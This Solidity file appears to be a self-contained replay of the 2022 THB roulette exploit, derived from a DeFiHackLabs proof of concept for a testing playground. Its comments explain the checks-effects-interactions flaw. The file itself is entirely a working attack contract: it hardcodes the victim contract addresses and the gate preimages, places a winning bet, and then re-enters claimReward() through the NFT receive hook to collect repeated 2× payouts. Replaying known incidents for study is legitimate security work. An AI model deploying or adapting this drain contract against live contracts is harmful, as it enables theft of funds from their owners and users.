// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-THB).
//
// The DeFiHackLabs PoC (test/THB_exp.sol) runs the attack INLINE in the Foundry
// `ContractTest` harness — the `onERC721Received` reentrancy hook and `receive()`
// live on the test itself (`attacker = address(this)`), and profit is the test
// contract's own BNB balance delta. There is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack (the
// testExploit body + the onERC721Received reentrancy loop + minimal inline
// interfaces — no imports so it compiles anywhere), compiled inside the registry
// forge project. Logic and constants are copied verbatim from test/THB_exp.sol.
//
// Root cause: House_Wallet.claimReward() pays the winner 2× the recorded bet,
// then mints a reward NFT via THB_Roulette.reward() → _safeMint, which fires the
// recipient's onERC721Received hook — and ONLY AFTER THAT deletes the win record
// (`delete winners[_ID][_player]`). This is a textbook checks-effects-interactions
// violation: while the attacker holds control inside the callback, the authorizing
// record is still live, so claimReward() can be re-entered with the same arguments
// for another 2× payout. Compounded by THB_Roulette.reward() having NO access
// control (anyone can mint) and the "secret" win/claim gates being on-chain
// sha256 hashes with public preimages. One 0.32 BNB bet is cashed out 5×.

interface IERC721 {
    function balanceOf(address) external view returns (uint256);
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external payable returns (bytes4);
}

interface HouseWallet {
    function winners(uint256 id, address player) external view returns (uint256);
    function claimReward(
        uint256 _ID,
        address payable _player,
        uint256 _amount,
        bool _rewardStatus,
        uint256 _x,
        string memory name,
        address _add
    ) external;
    function shoot(
        uint256 random,
        uint256 gameId,
        bool feestate,
        uint256 _x,
        string memory name,
        address _add,
        bool nftcheck,
        bool dystopianCheck
    ) external payable;
}

contract THBDrain is IERC721Receiver {
    HouseWallet constant houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
    IERC721 constant THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C);

    uint256 gameId = 1;
    bool feestate = false;
    // Preimages whose sha256(abi.encode(_x, name, _add)) == hashValueTwo (the win
    // gate). On-chain-readable constants — no luck involved.
    uint256 _x = 2_845_798_969_920_214_568_462_001_258_446;
    string name = "HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS";
    address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;
    bool nftcheck = true;
    bool dystopianCheck = true;
    bool _rewardStatus = true;
    // Preimages whose sha256(abi.encode(_x1, name1, _add)) == hashValue (the
    // claim-validity gate).
    uint256 _x1 = 969_820_990_102_090_205_468_486;
    string name1 = "WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME";

    function run() external {
        // 1. Place a winning 0.32 BNB bet → winners[1][this] = 0.30828 BNB.
        houseWallet.shoot{value: 0.32 ether}(
            12_345_678_000_000_000_000_000_000,
            gameId,
            feestate,
            _x,
            name,
            _add,
            nftcheck,
            dystopianCheck
        );
        // 2. Read the recorded win amount (must match exactly on each re-entry).
        uint256 _amount = houseWallet.winners(gameId, payable(address(this)));
        // 3. Claim #1 — payout + NFT mint fires onERC721Received before delete,
        //    so the reentrancy loop below drains 4 more payouts.
        houseWallet.claimReward(gameId, payable(address(this)), _amount, _rewardStatus, _x1, name1, _add);
    }

    // Collects the 2× BNB payouts from each claimReward.
    receive() external payable {}

    // Reentrancy engine: _safeMint calls this BEFORE `delete winners` runs, so the
    // win record is still live and claimReward() can be re-entered for another 2×
    // payout. The balance guard stops the loop right before the house can no
    // longer afford the next payout (so the final claim doesn't revert).
    function onERC721Received(address, address, uint256, bytes calldata) external payable returns (bytes4) {
        uint256 _amount = houseWallet.winners(gameId, payable(address(this)));
        if (address(houseWallet).balance >= _amount * 2) {
            houseWallet.claimReward(gameId, payable(address(this)), _amount, _rewardStatus, _x1, name1, _add);
        }
        return this.onERC721Received.selector;
    }
}
